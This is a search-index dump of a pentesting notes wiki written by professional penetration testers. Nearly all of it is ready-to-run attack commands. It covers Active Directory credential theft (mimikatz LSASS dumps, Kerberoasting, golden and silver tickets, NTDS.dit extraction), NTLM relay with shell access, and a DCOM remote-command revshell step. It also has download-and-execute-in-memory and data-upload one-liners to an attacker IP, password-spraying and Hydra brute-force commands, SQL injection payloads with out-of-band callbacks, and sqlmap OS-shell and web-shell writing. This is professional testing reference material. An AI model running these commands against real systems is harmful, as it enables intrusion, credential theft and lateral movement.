{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"<p>This Wiki/Blog is a place where we share our personal notes related to ethical hacking and pentesting.</p> <p>Feel free to exlore and grab whatever you need.</p>"},{"location":"#authors","title":"Authors","text":"<ul> <li> <p>Julienpeps</p> <p>Penetration Tester @ NTT</p> <p> </p> </li> <li> <p>Louyus</p> <p>Penetration Tester @ Nviso</p> <p> </p> </li> <li> <p>YannisK</p> <p>Penetration Tester @ Nviso</p> <p> </p> </li> </ul>"},{"location":"Active%20Directory/AS-REP%20Roasting/","title":"AS REP Roasting","text":"","tags":["windows","AD","passwords","pivoting","kerberos"]},{"location":"Active%20Directory/AS-REP%20Roasting/#from-linux","title":"From Linux","text":"<ol> <li> <p>Use Impacket's GetNPUsers script: <pre><code># Brute-forcing usernames\nGetNPUsers.py -dc-ip \"$DC_IP\" -usersfile \"$USERS_FILE\" -format hashcat -outputfile \"$OUTFILE\"\n\n# Knowing domain creds\nGetNPUsers.py -dc-ip \"$DC_IP\" -request -format hashcat -outputfile \"$OUTFILE\" \"$DOMAIN/$USER\"\n</code></pre></p> </li> <li> <p>Crack with hashcat mode 18200</p> </li> </ol>","tags":["windows","AD","passwords","pivoting","kerberos"]},{"location":"Active%20Directory/AS-REP%20Roasting/#from-windows","title":"From Windows","text":"<ol> <li> <p>Use Rubeus with asreproast: <pre><code>.\\Rubeus.exe asreproast /nowrap\n</code></pre></p> </li> <li> <p>Crack with hashcat mode 18200</p> </li> </ol>","tags":["windows","AD","passwords","pivoting","kerberos"]},{"location":"Active%20Directory/DCOM/","title":"DCOM","text":"<p>Exploit the Distributed Component Object Model for lateral movement.</p> <p>Only prerequisite is to be local admin.</p>","tags":["windows","AD","lateral"]},{"location":"Active%20Directory/DCOM/#in-practice","title":"In practice","text":"<ol> <li> <p>Instantiate a remote MMC 2.0 application: <pre><code>$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"$TARGET_IP\"))\n</code></pre></p> </li> <li> <p>Execute a command (i.e. revshell): ```powershell $dcom.Document.ActiveView.ExecuteShellCommand(\"$CMD\",$null,\"$CMD_PARAMS\",\"7\")</p> </li> </ol>","tags":["windows","AD","lateral"]},{"location":"Active%20Directory/Dumping%20LSASS/","title":"Dumping LSASS","text":"<p>Note: SYSTEM / Local Admin Privileges are required to dump LSASS</p>","tags":["windows","AD","passwords","pivoting","ntlm","kerberos"]},{"location":"Active%20Directory/Dumping%20LSASS/#method-1","title":"Method 1","text":"<p>Steal NTLM (or others) hashes of logged on users</p> <ol> <li>Run <code>mimikatz.exe</code></li> <li>Engage the <code>SeDebugPrivlege</code> privilege with <code>privilege::debug</code></li> <li>Dump credentials with <code>sekurlsa::logonPasswords</code></li> </ol>","tags":["windows","AD","passwords","pivoting","ntlm","kerberos"]},{"location":"Active%20Directory/Dumping%20LSASS/#method-2","title":"Method 2","text":"<p>Abuses TGT and service tickets -&gt; steal TGT &amp; TGS</p> <ol> <li>List the content of a SMB share on target machine -&gt; creates and caches a service ticket</li> <li>Run <code>mimikatz.exe</code></li> <li>Engage the <code>SeDebugPrivlege</code> privilege with <code>privilege::debug</code></li> <li>Dump credentials with <code>sekurlsa::tickets</code></li> </ol>","tags":["windows","AD","passwords","pivoting","ntlm","kerberos"]},{"location":"Active%20Directory/Golden%20Ticket/","title":"Golden Ticket","text":"<p>Create a custom TGT (= golden ticket) with the <code>krbtgt</code> password hash.</p> <p>Golden tickets grant unlimited and persistent access to AD resources.</p>","tags":["windows","AD","kerberos","lateral","persistence"]},{"location":"Active%20Directory/Golden%20Ticket/#with-mimikatzexe","title":"With mimikatz.exe","text":"<ol> <li> <p>On DC, dump krbtgt hash: <pre><code>privilege::debug\nlsadump::lsa /patch\n</code></pre></p> </li> <li> <p>On any machine, create a TGT with the krbtgt hash: <pre><code>kerberos::purge\nkerberos::golden /user:$USER /domain:$DOMAIN /sid:$DOM_SID /krbtgt:$HASH /ptt\nmisc::cmd\n</code></pre></p> </li> </ol>","tags":["windows","AD","kerberos","lateral","persistence"]},{"location":"Active%20Directory/Kerberoasting/","title":"Kerberoasting","text":"","tags":["windows","AD","passwords","pivoting","kerberos"]},{"location":"Active%20Directory/Kerberoasting/#from-linux","title":"From Linux","text":"<ol> <li> <p>Use Impacket's GetUserSPNs script: <pre><code>GetUserSPNs.py -dc-ip \"$DC_IP\" -request -outputfile \"$OUTFILE\" \"$DOMAIN/$USER\"\n</code></pre></p> </li> <li> <p>Crack with hashcat mode 13100</p> </li> </ol>","tags":["windows","AD","passwords","pivoting","kerberos"]},{"location":"Active%20Directory/Kerberoasting/#from-windows","title":"From Windows","text":"<ol> <li> <p>Use Rubeus with kerberoast: <pre><code>.\\Rubeus.exe kerberoast /nowrap\n</code></pre></p> </li> <li> <p>Crack with hashcat mode 13100</p> </li> </ol>","tags":["windows","AD","passwords","pivoting","kerberos"]},{"location":"Active%20Directory/NTLM%20Relay%20Attack/","title":"NTLM Relay Attack","text":"<p>Intercept a NTLM hash (like Responder) and relay it to another machine/service.</p> <p>This is particularly useful when hashes cannot be cracked.</p>"},{"location":"Active%20Directory/NTLM%20Relay%20Attack/#relay-to-a-single-target","title":"Relay to a single target","text":"<pre><code>ntlmrelayx -smb2support -t \"$TARGET\"\n</code></pre>"},{"location":"Active%20Directory/NTLM%20Relay%20Attack/#relay-to-multiple-targets","title":"Relay to multiple targets","text":"<pre><code>ntlmrelayx -smb2support -ts \"$TARGETS_FILE\"\n</code></pre>"},{"location":"Active%20Directory/NTLM%20Relay%20Attack/#execute-a-command-on-target","title":"Execute a command on target","text":"<pre><code>ntlmrelayx -smb2support -t \"$TARGET\" -c \"$COMMAND\"\n</code></pre>"},{"location":"Active%20Directory/NTLM%20Relay%20Attack/#open-a-bind-shell","title":"Open a bind shell","text":"<pre><code>ntlmrelayx -smb2support -t \"$TARGET\" -i\n</code></pre>"},{"location":"Active%20Directory/Overpass%20The%20Hash/","title":"Overpass The Hash","text":"<p>Gain a Kerberos TGT from a NTLM hash, then use it to forge a TGS.</p>","tags":["windows","AD","lateral","kerberos","ntlm"]},{"location":"Active%20Directory/Overpass%20The%20Hash/#with-mimikatzexe","title":"With mimikatz.exe","text":"<ol> <li> <p>In mimikatz: <pre><code>privilege::debug\nsekurlsa::pth /user:$TARGET_USER /domain:$DOMAIN /ntlm:$TARGET_HASH /run:powershell\n</code></pre></p> </li> <li> <p>Create a TGT by accessing a share on target</p> </li> <li>Check that the ticket was created with <code>klist</code></li> </ol>","tags":["windows","AD","lateral","kerberos","ntlm"]},{"location":"Active%20Directory/Overpass%20The%20Hash/#with-rubeus","title":"With Rubeus","text":"<pre><code>.\\Rubeus.exe asktgt /domain:$DOMAIN /user:$TARGET_USER /rc4:$TARGET_HASH /ptt\n</code></pre> <p>Check that the ticket was created with <code>klist</code></p>","tags":["windows","AD","lateral","kerberos","ntlm"]},{"location":"Active%20Directory/PSExec/","title":"PSExec","text":"","tags":["windows","lateral","sysinternals"]},{"location":"Active%20Directory/PSExec/#prerequisites","title":"Prerequisites","text":"<ul> <li>User that authenticates to target need to be admin</li> <li><code>ADMIN$</code> share must be writeable</li> <li>File and Printer Sharing must be enabled</li> </ul>","tags":["windows","lateral","sysinternals"]},{"location":"Active%20Directory/PSExec/#usage","title":"Usage","text":"<pre><code>./PsExec64.exe -i \\\\$TARGET -u $DOMAIN\\$USER -p $PASS\n</code></pre>","tags":["windows","lateral","sysinternals"]},{"location":"Active%20Directory/Pass%20the%20Ticket/","title":"Pass the Ticket","text":"<p>Steal a user's auth ticket and use it to impersonate the user.</p>","tags":["windows","AD","kerberos","lateral"]},{"location":"Active%20Directory/Pass%20the%20Ticket/#with-mimikatzexe","title":"With mimikatz.exe","text":"<ol> <li> <p>In mimikatz: <pre><code>privilege::debug\nsekurlsa::tickets /export\nexit\n</code></pre></p> </li> <li> <p>Check generated tickets with <code>dir *.kirbi</code></p> </li> <li> <p>In mimikatz: <pre><code>kerberos::ptt $TICKET.kirbi\nexit\n</code></pre></p> </li> <li> <p>Check that the ticket was created with <code>klist</code></p> </li> </ol>","tags":["windows","AD","kerberos","lateral"]},{"location":"Active%20Directory/Password%20Spraying/","title":"Password Spraying","text":""},{"location":"Active%20Directory/Password%20Spraying/#from-linux","title":"From Linux","text":""},{"location":"Active%20Directory/Password%20Spraying/#rpcclient","title":"rpcclient","text":"<p>We can use rpcclient with a bash script in order to perform password spraying. We must then filter the results with a grep on <code>Authority</code> in the response. Here is a bash one-liner:</p> <pre><code>for u in $(cat &lt;username-list&gt;);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; done\n</code></pre>"},{"location":"Active%20Directory/Password%20Spraying/#kerbrute","title":"Kerbrute","text":"<pre><code>kerbrute passwordspray -d &lt;domain&gt; --dc &lt;IP&gt; &lt;username-list&gt; &lt;password&gt;\n</code></pre>"},{"location":"Active%20Directory/Password%20Spraying/#crackmapexec","title":"CrackMapExec","text":"<pre><code>crackmapexec smb &lt;IP&gt; -u &lt;users list&gt; -p &lt;password&gt; | grep +\n</code></pre>"},{"location":"Active%20Directory/Password%20Spraying/#pass-the-hash-spraying","title":"Pass-the-Hash spraying","text":"<p>When we only have the NTLM hash of the local admin, we can spray the NT hash on the entire network.The <code>--local-auth</code> flag is used to only attempt one login on each machine in order to avoid account lockout. Be careful because this method makes a lot of noise.</p> <pre><code>crackmapexec smb --local-auth &lt;net-ip/mask&gt; -u administrator -H &lt;hash&gt; | grep +\n</code></pre>"},{"location":"Active%20Directory/Password%20Spraying/#from-windows","title":"From Windows","text":""},{"location":"Active%20Directory/Password%20Spraying/#domainpasswordspray","title":"DomainPasswordSpray","text":"<p>When we have a foothold in the domain, we can perform password spraying with DomainPasswordSpray. The tool can generate a user list, query the password policy and make the exact amount of trials not to lock out the accounts.</p> <p>To use the tool, we must import it first: <pre><code>Import-Module .\\DomainPasswordSpray.ps1\n</code></pre></p> <p>We can then use it: <pre><code>PS C:\\htb&gt; Invoke-DomainPasswordSpray -Password &lt;password&gt; -OutFile &lt;output&gt; -ErrorAction SilentlyContinue\n</code></pre></p>"},{"location":"Active%20Directory/Shadow%20Copies/","title":"Shadow Copies","text":"<p>Steal the AD's NTDS.dit DB file &amp; the SYSTEM hive to exectract every user credential.</p>","tags":["windows","AD","persistence"]},{"location":"Active%20Directory/Shadow%20Copies/#in-practice","title":"In practice","text":"<ol> <li> <p>On DC, as admin, create the backup: <pre><code>vshadow.exe -nw -p C:\n</code></pre></p> </li> <li> <p>Grab the value of \"Shadow copy device name\" from above output, and copy it to attacker machine.</p> </li> <li> <p>Extract the SYSTEM hive, and copy it to attacker machine: <pre><code>reg.exe export HKLM\\SYSTEM C:\\SYSTEM.reg\n</code></pre></p> </li> <li> <p>Extract the hashes locally: <pre><code>secretsdump.py -ntds $NTDS_FILE -system $REG_FILE LOCAL\n</code></pre></p> </li> </ol>","tags":["windows","AD","persistence"]},{"location":"Active%20Directory/Silver%20Tickets/","title":"Silver Tickets","text":"<p>Steal a service account's NTLM hash and use it to forge a TGS ticket which can be used access specific services on the network.</p>","tags":["windows","AD","passwords","pivoting","kerberos","lateral"]},{"location":"Active%20Directory/Silver%20Tickets/#required-information","title":"Required information","text":"<ul> <li>SPN's NTLM hash<ul> <li>e.g. Mimikatz</li> </ul> </li> <li>Domain SID<ul> <li>Run <code>whoami /user</code></li> <li>Isolate the SID -&gt; Remove the last part (after the -)</li> </ul> </li> <li>Target machine<ul> <li>FQDN -&gt; i.e. <code>web04.corp.com</code></li> <li>Where SPN runs</li> <li>Service is for instance HTTP</li> </ul> </li> </ul>","tags":["windows","AD","passwords","pivoting","kerberos","lateral"]},{"location":"Active%20Directory/Silver%20Tickets/#from-linux","title":"From Linux","text":"<pre><code>ticketer.py -nthash \"$HASH\" -spn \"$SPN\" -domain-sid \"$DOMAIN_SID\" -domain \"$DOMAIN\" \"$USER\"\nexport KRB5CCNAME=\"/root/impacket-examples/$TICKET_NAME.ccache\"\npsexec.py \"$DOMAIN\"/\"$USER\"@\"$TARGET\" -k -no-pass\n</code></pre>","tags":["windows","AD","passwords","pivoting","kerberos","lateral"]},{"location":"Active%20Directory/Silver%20Tickets/#from-windows","title":"From Windows","text":"<ol> <li>Run mimikatz.exe</li> <li>Run <code>kerberos::golden</code>: <pre><code>kerberos::golden /sid:$DOMAIN_SID /domain:$DOMAIN /ptt /target:$TARGET /service:$SERVICE /rc4:$HASH /user:$TARGET_USER\nexit\n</code></pre></li> <li>Check that the ticket was created with <code>klist</code></li> </ol>","tags":["windows","AD","passwords","pivoting","kerberos","lateral"]},{"location":"Android/Broadcast/","title":"Broadcasts","text":"","tags":["Android","Mobile","Broadcast"]},{"location":"Android/Broadcast/#overview","title":"Overview","text":"<p>Broadcast is a messaging system that allows applications and the system to send (broadcast) or receive messages using broadcast receivers (events) across the whole system. It is used for communication between different parts of the system and various applications. Broadcasts can inform all apps about events such as:</p> <ul> <li>Low battery</li> <li>AirPlane mode changed</li> <li>Headset plugged</li> <li>...</li> </ul>","tags":["Android","Mobile","Broadcast"]},{"location":"Android/Broadcast/#send-a-broadcast-using-am","title":"Send a broadcast using am","text":"<p>The intent-filter is the event that the broadcast is subscribed to <pre><code>am broadcast -a &lt;intent-filter&gt;\n</code></pre></p>","tags":["Android","Mobile","Broadcast"]},{"location":"Android/Broadcast/#sniff-a-broadcast-using-drozer","title":"Sniff a broadcast using Drozer","text":"<pre><code>run app.broadcast.sniff --action &lt;intent-filter&gt;\n</code></pre>","tags":["Android","Mobile","Broadcast"]},{"location":"Android/Deeplinks/","title":"Deeplinks","text":"","tags":["Android","Mobile","deep links"]},{"location":"Android/Deeplinks/#find-deep-links","title":"Find Deep links","text":"<p>Use Android-Deeplink-Parser script: <pre><code>python3 deeplinkparser.py \"$APK_FILE\"\n</code></pre></p>","tags":["Android","Mobile","deep links"]},{"location":"Android/Deeplinks/#trigger-a-deep-link-using-adb","title":"Trigger a Deep Link using adb","text":"<pre><code>adb shell am start -a android.intent.action.VIEW -d \"&lt;deeplink&gt;\" &lt;package&gt;\n</code></pre>","tags":["Android","Mobile","deep links"]},{"location":"Cheatsheets/File%20Transfer/","title":"File Transfer","text":"Command Description <code>Invoke-WebRequest https://&lt;snip&gt;/PowerView.ps1 -OutFile PowerView.ps1</code> Download a file with PowerShell <code>IEX (New-Object Net.WebClient).DownloadString('https://&lt;snip&gt;/Invoke-Mimikatz.ps1')</code> Execute a file in memory using PowerShell <code>Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64</code> Upload a file with PowerShell <code>bitsadmin /transfer n http://10.10.10.32/nc.exe C:\\Temp\\nc.exe</code> Download a file using Bitsadmin <code>certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe</code> Download a file using Certutil <code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code> Download a file using Wget <code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code> Download a file using cURL <code>php -r '$file = file_get_contents(\"https://&lt;snip&gt;/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'</code> Download a file using PHP <code>scp C:\\Temp\\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip</code> Upload a file using SCP <code>scp user@target:/tmp/mimikatz.exe C:\\Temp\\mimikatz.exe</code> Download a file using SCP <code>Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile \"nc.exe\"</code> Invoke-WebRequest using a Chrome User Agent"},{"location":"Cheatsheets/Hydra/","title":"Hydra","text":"Command Description <code>hydra -h</code> hydra help <code>hydra -C wordlist.txt SERVER_IP -s PORT http-get /</code> Basic Auth Brute Force - Combined Wordlist <code>hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /</code> Basic Auth Brute Force - User/Pass Wordlists <code>hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form \"/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name='login'\"</code> Login Form Brute Force - Static User, Pass Wordlist <code>hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4</code> SSH Brute Force - User/Pass Wordlists <code>hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1</code> FTP Brute Force - Static User, Pass Wordlist"},{"location":"Cheatsheets/Hydra/#wordlist-customization","title":"Wordlist Customization","text":"Command Description <code>cupp -i</code> Creating Custom Password Wordlist <code>sed -ri '/^.{,7}$/d' william.txt</code> Remove Passwords Shorter Than 8 <code>sed -ri '/[!-/:-@\\[-`\\{-~]+/!d' william.txt</code> Remove Passwords With No Special Chars <code>sed -ri '/[0-9]+/!d' william.txt</code> Remove Passwords With No Numbers <code>./username-anarchy Bill Gates &gt; bill.txt</code> Generate Usernames List <code>ssh b.gates@SERVER_IP -p PORT</code> SSH to Server <code>ftp 127.0.0.1</code> FTP to Server <code>su - user</code> Switch to User"},{"location":"Cheatsheets/Linux%20Privesc/","title":"Linux Privesc","text":"","tags":["linux","privesc","cheatsheet"]},{"location":"Cheatsheets/Linux%20Privesc/#manual","title":"Manual","text":"<pre><code># User(s)\nid\ncat /etc/passwd\nenv\ncat ~/.bashrc\nsudo -l\n\n# Machine\nhostname\ncat /etc/issue\ncat /etc/os-release\nuname -a\n\n# Disks\nlsblk\n/etc/fstab\nmount\n\n# Processes\nps aux\nwatch -n 1 \"ps -aux | grep pass\"\n\n# Network\nip a\nroutedel\nss -anp\ncat /etc/iptables/rules.v4\nsudo tcpdump -i lo -A | grep \"pass\"\n\n# CRON\nla -lah /etc/cron*\ncrontab -l\n\n# Applications\ndpkg -l\n\n# Files permissions\nfind / -writable -type d 2&gt;/dev/null\nfind / -perm -u=s -type f 2&gt;/dev/null\nls -l /etc/passwd\nls -l /etc/shadow\n\n# Modules\nlsmod\n/sbin/modinfo $MODULE\n\n# Interesting dirs\nls -la /opt/\n</code></pre>","tags":["linux","privesc","cheatsheet"]},{"location":"Cheatsheets/Linux%20Privesc/#tools","title":"Tools","text":"<ul> <li>LinPEAS</li> <li>unix-privesc-check</li> <li>pspy</li> </ul>","tags":["linux","privesc","cheatsheet"]},{"location":"Cheatsheets/NMAP/","title":"NMAP","text":""},{"location":"Cheatsheets/NMAP/#scanning-options","title":"Scanning Options","text":"Nmap Option Description <code>10.10.10.0/24</code> Target network range. <code>-sn</code> Disables port scanning. <code>-Pn</code> Disables ICMP Echo Requests <code>-n</code> Disables DNS Resolution. <code>-PE</code> Performs the ping scan by using ICMP Echo Requests against the target. <code>--packet-trace</code> Shows all packets sent and received. <code>--reason</code> Displays the reason for a specific result. <code>--disable-arp-ping</code> Disables ARP Ping Requests. <code>--top-ports=&lt;num&gt;</code> Scans the specified top ports that have been defined as most frequent. <code>-p-</code> Scan all ports. <code>-p22-110</code> Scan all ports between 22 and 110. <code>-p22,25</code> Scans only the specified ports 22 and 25. <code>-F</code> Scans top 100 ports. <code>-sS</code> Performs an TCP SYN-Scan. <code>-sA</code> Performs an TCP ACK-Scan. <code>-sU</code> Performs an UDP Scan. <code>-sV</code> Scans the discovered services for their versions. <code>-sC</code> Perform a Script Scan with scripts that are categorized as \"default\". <code>--script &lt;script&gt;</code> Performs a Script Scan by using the specified scripts. <code>-O</code> Performs an OS Detection Scan to determine the OS of the target. <code>-A</code> Performs OS Detection, Service Detection, and traceroute scans. <code>-D RND:5</code> Sets the number of random Decoys that will be used to scan the target. <code>-e</code> Specifies the network interface that is used for the scan. <code>-S 10.10.10.200</code> Specifies the source IP address for the scan. <code>-g</code> Specifies the source port for the scan. <code>--dns-server &lt;ns&gt;</code> DNS resolution is performed by using a specified name server."},{"location":"Cheatsheets/NMAP/#output-options","title":"Output Options","text":"Nmap Option Description <code>-oA filename</code> Stores the results in all available formats starting with the name of \"filename\". <code>-oN filename</code> Stores the results in normal format with the name \"filename\". <code>-oG filename</code> Stores the results in \"grepable\" format with the name of \"filename\". <code>-oX filename</code> Stores the results in XML format with the name of \"filename\"."},{"location":"Cheatsheets/NMAP/#performance-options","title":"Performance Options","text":"Nmap Option Description <code>--max-retries &lt;num&gt;</code> Sets the number of retries for scans of specific ports. <code>--stats-every=5s</code> Displays scan's status every 5 seconds. <code>-v/-vv</code> Displays verbose output during the scan. <code>--initial-rtt-timeout 50ms</code> Sets the specified time value as initial RTT timeout. <code>--max-rtt-timeout 100ms</code> Sets the specified time value as maximum RTT timeout. <code>--min-rate 300</code> Sets the number of packets that will be sent simultaneously. <code>-T &lt;0-5&gt;</code> Specifies the specific timing template."},{"location":"Cheatsheets/SQLi/","title":"SQL Injection","text":"<ul> <li> <p>Sources</p> <p> PortSwigger - SQL injection cheat sheet</p> </li> </ul>"},{"location":"Cheatsheets/SQLi/#string-concatenation","title":"String Concatenation","text":"MySQLPostgresMSSQLOracle <p><pre><code>'foo' 'bar'\n</code></pre> <pre><code>CONCAT('foo', 'bar')\n</code></pre></p> <pre><code>'foo'||'bar'\n</code></pre> <pre><code>'foo'+'bar'\n</code></pre> <pre><code>'foo'||'bar'\n</code></pre>"},{"location":"Cheatsheets/SQLi/#substring","title":"Substring","text":"MySQLPostgresMSSQLOracle <pre><code>SUBSTRING('foobar', 2, 3)\n</code></pre> <pre><code>SUBSTRING('foobar', 2, 3)\n</code></pre> <pre><code>SUBSTRING('foobar', 2, 3)\n</code></pre> <pre><code>SUBSTR('foobar', 2, 3)\n</code></pre>"},{"location":"Cheatsheets/SQLi/#stacked-queries","title":"Stacked Queries","text":"MySQLPostgresMSSQL <pre><code>QUERY-1-HERE; QUERY-2-HERE\n</code></pre> <pre><code>QUERY-1-HERE; QUERY-2-HERE\n</code></pre> <pre><code>QUERY-1-HERE; QUERY-2-HERE\n</code></pre>"},{"location":"Cheatsheets/SQLi/#comments","title":"Comments","text":"MySQLPostgresMSSQLOracle <p><pre><code>-- This is a comment\n</code></pre> <pre><code>/* This is a comment */\n</code></pre> <pre><code># This is a comment\n</code></pre></p> <p><pre><code>-- This is a comment\n</code></pre> <pre><code>/* This is a comment */\n</code></pre></p> <p><pre><code>-- This is a comment\n</code></pre> <pre><code>/* This is a comment */\n</code></pre></p> <pre><code>-- This is a comment\n</code></pre>"},{"location":"Cheatsheets/SQLi/#database-version","title":"Database Version","text":"MySQLPostgresMSSQLOracle <pre><code>SELECT @@version\n</code></pre> <pre><code>SELECT version()\n</code></pre> <pre><code>SELECT @@VERSION\n</code></pre> <p><pre><code>SELECT banner FROM v$version\n</code></pre> <pre><code>SELECT version FROM v$instance\n</code></pre></p>"},{"location":"Cheatsheets/SQLi/#time-delays","title":"Time Delays","text":"MySQLPostgresMSSQLOracle <pre><code>SELECT sleep(5)\n</code></pre> <pre><code>SELECT pg_sleep(5)\n</code></pre> <pre><code>WAITFOR DELAY '00:00:05'\n</code></pre> <pre><code>dbms_pipe.receive_message(('a'),10)\n</code></pre>"},{"location":"Cheatsheets/SQLi/#list-tables","title":"List Tables","text":"MySQLPostgresMSSQLOracle <pre><code>SELECT * FROM information_schema.tables\n</code></pre> <pre><code>SELECT * FROM information_schema.tables\n</code></pre> <pre><code>SELECT * FROM information_schema.tables\n</code></pre> <pre><code>SELECT * FROM all_tables\n</code></pre>"},{"location":"Cheatsheets/SQLi/#list-columns-of-a-table","title":"List Columns of a Table","text":"MySQLPostgresMSSQLOracle <pre><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\n</code></pre> <pre><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\n</code></pre> <pre><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\n</code></pre> <pre><code>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'\n</code></pre>"},{"location":"Cheatsheets/SQLi/#conditional-errors","title":"Conditional Errors","text":"MySQLPostgresMSSQLOracle <pre><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')\n</code></pre> <pre><code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)\n</code></pre> <pre><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END\n</code></pre> <pre><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual\n</code></pre>"},{"location":"Cheatsheets/SQLi/#extracting-data-via-visible-error-messages","title":"Extracting data via visible error messages","text":"MySQLPostgresMSSQL <pre><code>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))\n</code></pre> <pre><code>SELECT CAST((SELECT password FROM users LIMIT 1) AS int)\n</code></pre> <pre><code> SELECT 'foo' WHERE 1 = (SELECT 'secret')\n</code></pre>"},{"location":"Cheatsheets/SQLi/#dns-lookup","title":"DNS Lookup","text":"MySQLPostgresMSSQLOracle <p>Both are Windows only</p> <p><pre><code>LOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')\n</code></pre> <pre><code>SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'\n</code></pre></p> <pre><code>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'\n</code></pre> <pre><code>exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'\n</code></pre> <p>This has been patched, but still findable: <pre><code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN/\"&gt; %remote;]&gt;'),'/l') FROM dual\n</code></pre></p> <p>This requires elevated privileges: <pre><code>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')\n</code></pre></p>"},{"location":"Cheatsheets/SQLmap/","title":"SQLmap","text":"Command Description <code>sqlmap -h</code> View the basic help menu <code>sqlmap -hh</code> View the advanced help menu <code>sqlmap -u \"http://www.example.com/vuln.php?id=1\" --batch</code> Run <code>SQLMap</code> without asking for user input <code>sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test'</code> <code>SQLMap</code> with POST request <code>sqlmap 'http://www.example.com/' --data 'uid=1*&amp;name=test'</code> POST request specifying an injection point with an asterisk <code>sqlmap -r req.txt</code> Passing an HTTP request file to <code>SQLMap</code> <code>sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</code> Specifying a cookie header <code>sqlmap -u www.target.com --data='id=1' --method PUT</code> Specifying a PUT request <code>sqlmap -u \"http://www.target.com/vuln.php?id=1\" --batch -t /tmp/traffic.txt</code> Store traffic to an output file <code>sqlmap -u \"http://www.target.com/vuln.php?id=1\" -v 6 --batch</code> Specify verbosity level <code>sqlmap -u \"www.example.com/?q=test\" --prefix=\"%'))\" --suffix=\"-- -\"</code> Specifying a prefix or suffix <code>sqlmap -u www.example.com/?id=1 -v 3 --level=5</code> Specifying the level and risk <code>sqlmap -u \"http://www.example.com/?id=1\" --banner --current-user --current-db --is-dba</code> Basic DB enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --tables -D testdb</code> Table enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb -C name,surname</code> Table/row enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb --where=\"name LIKE 'f%'\"</code> Conditional enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --schema</code> Database schema enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --search -T user</code> Searching for data <code>sqlmap -u \"http://www.example.com/?id=1\" --passwords --batch</code> Password enumeration and cracking <code>sqlmap -u \"http://www.example.com/\" --data=\"id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE\" --csrf-token=\"csrf-token\"</code> Anti-CSRF token bypass <code>sqlmap --list-tampers</code> List all tamper scripts <code>sqlmap -u \"http://www.example.com/case1.php?id=1\" --is-dba</code> Check for DBA privileges <code>sqlmap -u \"http://www.example.com/?id=1\" --file-read \"/etc/passwd\"</code> Reading a local file <code>sqlmap -u \"http://www.example.com/?id=1\" --file-write \"shell.php\" --file-dest \"/var/www/html/shell.php\"</code> Writing a file <code>sqlmap -u \"http://www.example.com/?id=1\" --os-shell</code> Spawning an OS shell"},{"location":"Cheatsheets/Services/","title":"Services","text":""},{"location":"Cheatsheets/Services/#ftp","title":"FTP","text":"Command Description <code>ftp &lt;FQDN/IP&gt;</code> Interact with the FTP service on the target. <code>nc -nv &lt;FQDN/IP&gt; 21</code> Interact with the FTP service on the target. <code>telnet &lt;FQDN/IP&gt; 21</code> Interact with the FTP service on the target. <code>openssl s_client -connect &lt;FQDN/IP&gt;:21 -starttls ftp</code> Interact with the FTP service on the target using encrypted connection. <code>wget -m --no-passive ftp://anonymous:anonymous@&lt;target&gt;</code> Download all available files on the target FTP server."},{"location":"Cheatsheets/Services/#smb","title":"SMB","text":"Command Description <code>smbclient -N -L //&lt;FQDN/IP&gt;</code> Null session authentication on SMB. <code>smbclient //&lt;FQDN/IP&gt;/&lt;share&gt;</code> Connect to a specific SMB share. <code>rpcclient -U \"\" &lt;FQDN/IP&gt;</code> Interaction with the target using RPC. <code>samrdump.py &lt;FQDN/IP&gt;</code> Username enumeration using Impacket scripts. <code>smbmap -H &lt;FQDN/IP&gt;</code> Enumerating SMB shares. <code>crackmapexec smb &lt;FQDN/IP&gt; --shares -u '' -p ''</code> Enumerating SMB shares using null session authentication. 